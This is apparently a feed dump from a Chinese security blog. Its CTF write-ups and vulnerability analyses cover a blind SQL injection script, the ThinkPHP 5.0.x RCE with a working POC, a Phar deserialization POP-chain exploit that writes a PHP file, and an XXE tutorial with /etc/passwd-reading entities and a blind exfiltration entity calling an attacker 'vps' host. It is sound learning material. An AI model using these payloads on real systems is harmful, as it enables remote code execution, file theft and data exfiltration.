&quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&#39;%s&#39;,sleep(3),0)%%23&quot; % (i, j)            if login(payload):                data += str(j)                print &quot;[+] Found : %s&quot; % (data)                breakif __name__ == &quot;__main__&quot;:    main()</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><pre><code>binwalk -e zhu.jpg</code></pre><p>Stegsolve</p><h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>volatility一把梭</p><pre><code>volatility imageinfo -f memory #分析操作系统volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash</code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c0c216b399.jpg" alt></p><p>得到管理员hash如下：</p><pre><code>Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</code></pre><p>所以<code>c22b315c040ae6e0efee3518d830362b</code>即为管理员密码的md5值，解出来是123456789，再md5一下就行。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>内存取证工具 volatility 使用说明：<a href="https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/" target="_blank" rel="noopener">https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</a></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>ypau -&gt; flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒杯月赛19新年场WriteUp&quot;&gt;&lt;a href=&quot;#安恒杯月赛19新年场WriteUp&quot; class=&quot;headerlink&quot; title=&quot;安恒杯月赛19新年场WriteUp&quot;&gt;&lt;/a&gt;安恒杯月赛19新年场WriteUp&lt;/h1&gt;&lt;h1 id=&quot;Web&quot;&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.0~5.0.23RCE漏洞分析</title>
    <link href="https://hpdoger.cn/2019/01/20/ThinkPHP5.0.0~5.0.23RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/</id>
    <published>2019-01-19T16:00:00.000Z</published>
    <updated>2019-01-30T15:59:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP5-0-0-5-0-23RCE漏洞分析"><a href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析" class="headerlink" title="ThinkPHP5.0.0~5.0.23RCE漏洞分析"></a>ThinkPHP5.0.0~5.0.23RCE漏洞分析</h1><p>最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。</p><h1 id="TP5框架流程"><a href="#TP5框架流程" class="headerlink" title="TP5框架流程"></a>TP5框架流程</h1><p>应用启动在App.php的run()函数，说一下自己对这个框架的大致理解</p><p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p><p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p><p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p><pre><code>switch (self::$dispatch[&#39;type&#39;]) {    case &#39;redirect&#39;:        header(&#39;Location: &#39; . self::$dispatch[&#39;url&#39;], true, self::$dispatch[&#39;status&#39;]);        break;    case &#39;module&#39;:       $data = self::module(self::$dispatch[&#39;module&#39;], $config);        break;    case &#39;controller&#39;:        $data = Loader::action(self::$dispatch[&#39;controller&#39;], self::$dispatch[&#39;params&#39;]);        break;    case &#39;method&#39;:        $data = self::invokeMethod(self::$dispatch[&#39;method&#39;], self::$dispatch[&#39;params&#39;]);        break;    case &#39;function&#39;:        $data = self::invokeFunction(self::$dispatch[&#39;function&#39;], self::$dispatch[&#39;params&#39;]);        break;    default:        throw new Exception(&#39;dispatch type not support&#39;, 10008);}</code></pre><p>5、执行处理，返回输出。</p><p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p><p>所以核心操作就是调度请求。</p><h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p><pre><code>&lt;?php/*** 执行应用程序* @access public* @param  Request $request 请求对象* @return Response* @throws Exception*/public static function run(Request $request = null){    $request = is_null($request) ? Request::instance() : $request;    try {        ...        // 获取应用调度信息        $dispatch = self::$dispatch;        // 未设置调度信息则进行 URL 路由检测        if (empty($dispatch)) {            $dispatch = self::routeCheck($request, $config);        }        ...        $data = self::exec($dispatch, $config);    } catch (HttpResponseException $exception) {        ...    }    ...}</code></pre><p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p><pre><code>&lt;?php/**    * 当前的请求类型    * @access public    * @param bool $method  true 获取原始请求类型    * @return string    */public function method($method = false){    if (true === $method) {        // 获取原始请求类型        return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;    } elseif (!$this-&gt;method) {        if (isset($_POST[Config::get(&#39;var_method&#39;)])) {            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);            $this-&gt;{$this-&gt;method}($_POST);        } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {            $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);        } else {            $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        }    }    return $this-&gt;method;}</code></pre><p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p><p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p><pre><code>&lt;?phpprotected function __construct($options = []){    foreach ($options as $name =&gt; $item) {        if (property_exists($this, $name)) {            $this-&gt;$name = $item;        }    }    if (is_null($this-&gt;filter)) {        $this-&gt;filter = Config::get(&#39;default_filter&#39;);    }    // 保存 php://input    $this-&gt;input = file_get_contents(&#39;php://input&#39;);}</code></pre><p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p><p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p><p>request对象差不多清楚了，跟进self::routeCheck()</p><pre><code>&lt;?php/** * URL路由检测（根据PATH_INFO) * @access public * @param  \think\Request $request 请求实例 * @param  array          $config  配置信息 * @return array * @throws \think\Exception */public static function routeCheck($request, array $config){    $path   = $request-&gt;path();  //path=captcha    $depr   = $config[&#39;pathinfo_depr&#39;];    $result = false;    // 路由检测（根据路由定义返回不同的URL调度）    $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);    return $result;</code></pre><p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p><p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p><pre><code>&lt;?phpprotected static function exec($dispatch, $config){    switch ($dispatch[&#39;type&#39;]) {        ...        case &#39;method&#39;: // 回调方法            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);            $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);            break;        ...    }    return $data;}</code></pre><p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p><pre><code>&lt;?phppublic function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    if (empty($this-&gt;mergeParam)) {        $method = $this-&gt;method(true);        ...    }    ...    // 当前请求参数和URL地址中的参数合并    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));    $this-&gt;mergeParam = true;    ...    return $this-&gt;input($this-&gt;param, $name, $default, $filter);}</code></pre><p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p><p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p><pre><code>&lt;?phppublic function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    ...    // 解析过滤器    $filter = $this-&gt;getFilter($filter, $default);    if (is_array($data)) {        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);        reset($data);    }    ...}</code></pre><p>跟进getFilter</p><pre><code>protected function getFilter($filter, $default){    if (is_null($filter)) {        $filter = [];    } else {        $filter = $filter ?: $this-&gt;filter;        if (is_string($filter) &amp;&amp; false === strpos($filter, &#39;/&#39;)) {            $filter = explode(&#39;,&#39;, $filter);        } else {            $filter = (array) $filter;        }    }    $filter[] = $default;    return $filter;}</code></pre><p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p><p>从而调用call_user_func进行RCE</p><h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p><p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></li><li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li><li><a href="https://www.kancloud.cn/zmwtp/tp5/119426" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119426</a></li><li><a href="https://www.kancloud.cn/zmwtp/tp5/119428" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119428</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ThinkPHP5-0-0-5-0-23RCE漏洞分析&quot;&gt;&lt;a href=&quot;#ThinkPHP5-0-0-5-0-23RCE漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5.0.0~5.0.23RCE漏洞分析&quot;&gt;&lt;/a&gt;Think
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Code-breaking-medium之lumenserial</title>
    <link href="https://hpdoger.cn/2019/01/09/Code-breaking-medium%D6%AElumenserial/"/>
    <id>https://hpdoger.cn/2019/01/09/Code-breaking-medium֮lumenserial/</id>
    <published>2019-01-08T16:00:00.000Z</published>
    <updated>2019-01-09T13:50:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Code-breaking-medium之lumenserial"><a href="#Code-breaking-medium之lumenserial" class="headerlink" title="Code-breaking-medium之lumenserial"></a>Code-breaking-medium之lumenserial</h1><p>一道pop链很深的题，复现了一天，到目前已经有九个人做了。太菜了，只能照着柠檬和kk师傅的wp来学习思路。通过这次的复现，感受到耐心对审计的importance。记录一下在学习wp过程中得到的他见与己见。</p><p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p><h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p><p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p><pre><code>private function download($url){    $content = file_get_contents($url);</code></pre><p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p><pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</code></pre><h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p><p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p><pre><code>class PendingBroadcast{   public function __construct(Dispatcher $events, $event){    $this-&gt;event = $event;    $this-&gt;events = $events;}public function __destruct()    {        $this-&gt;events-&gt;dispatch($this-&gt;event);    }}</code></pre><p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p><p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p><p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p><h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><pre><code>public function __call($name, $arguments){    $i = 0;    do {        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);        $i++;        if ($i &gt; $this-&gt;maxRetries) {            throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));        }    } while (!call_user_func($this-&gt;validator, $res));    return $res;}</code></pre><p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p><p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p><h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><pre><code>public function __call($method, $attributes) {    return $this-&gt;format($method, $attributes);}</code></pre><p>继续跟进format方法</p><pre><code>public function format($formatter, $arguments = array()){    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  }</code></pre><p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p><pre><code>public function getFormatter($formatter){    if (isset($this-&gt;formatters[$formatter])) {        return $this-&gt;formatters[$formatter];    }</code></pre><p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p><p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p><p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p><h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p><p>这里看到师傅们找的了一个跳板类，赋值给了validator</p><p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p><pre><code>namespace PHPUnit\Framework\MockObject\Stub;class ReturnCallback implements Stub{public function invoke(Invocation $invocation){    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());}</code></pre><h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p><p>找到调用这个接口的类就行了，这里是</p><pre><code>namespace PHPUnit\Framework\MockObject\Invocation;class StaticInvocation implements Invocation, SelfDescribing{private $parameters;}</code></pre><p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p><h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p><p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p><h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p><pre><code>&lt;?phpnamespace Illuminate\Broadcasting{    class PendingBroadcast{        function __construct(){            $this-&gt;events = new \Faker\ValidGenerator();            $this-&gt;event = &#39;everything&#39;;        }    }}namespace PHPUnit\Framework\MockObject\Invocation{    class StaticInvocation{        function __construct(){            $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;);        }    }}namespace PHPUnit\Framework\MockObject\Stub{    class ReturnCallback{        function __construct(){            $this-&gt;callback = &#39;file_put_contents&#39;;        }    }}namespace Faker{    class ValidGenerator{        function __construct(){            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();            $g1 = new \Faker\Generator(array(&#39;everything&#39; =&gt; $evilobj ));            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();            $this-&gt;validator = array($rc, &quot;invoke&quot;);            $this-&gt;generator = $g2;            $this-&gt;maxRetries = 10000;        }    }    class Generator{        function __construct($form){            $this-&gt;formatters = $form;        }    }}namespace{    $exp = new Illuminate\Broadcasting\PendingBroadcast();    print_r(urlencode(serialize($exp)));    // phar    $p = new Phar(&#39;./hpdoger.phar&#39;, 0);    $p-&gt;startBuffering();    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);    $p-&gt;setMetadata($exp);    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);    $p-&gt;stopBuffering();}</code></pre><p>上传文件，接着进行反序列化</p><pre><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</code></pre><p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p><p>再次膜前辈师傅们</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Code-breaking-medium之lumenserial&quot;&gt;&lt;a href=&quot;#Code-breaking-medium之lumenserial&quot; class=&quot;headerlink&quot; title=&quot;Code-breaking-medium之lumense
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>从两道CTF题目学习XXE漏洞</title>
    <link href="https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://hpdoger.cn/2019/01/07/从两道CTF题目学习XXE漏洞/</id>
    <published>2019-01-06T16:00:00.000Z</published>
    <updated>2019-01-07T08:52:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p><h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p><p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p><h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p><p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p><p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p><p>关于外部实体引用file协议的例子如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;    %name;]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p><h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p><h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p><p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p><p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p><p><strong>PS：#PCDATA的意思是解析字符数据</strong></p><h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p><p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p><p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p><h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p><p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p><p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p><h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p><pre><code>&lt;?php  function __autoload($cls) {    include $cls;  }  class Black {    public function __construct($string, $default, $keyword, $store) {      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);      if ($store) {            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);      }    }  }  class Green {    public function __construct($string, $default, $keyword, $store) {      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);      if ($store) {            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);      }    }  }  if ($_=@$_GET[&#39;theme&#39;]) {    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {      if (@class_exists($_)) {        ($string = @$_GET[&#39;string&#39;]) || $string = false;        ($default = @$_GET[&#39;default&#39;]) || $default = false;        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);      }    }  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {    $args = explode(&#39;-&#39;, $_);    if (class_exists($args[0])) {      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);    }  } else if ($_=@$_GET[&#39;info&#39;]) {    phpinfo();  }  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p><p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p><p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p><p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p><p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p><p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p><p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p><p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file &quot;hpdoger&quot;&gt;&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;%send;]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p><p>2、 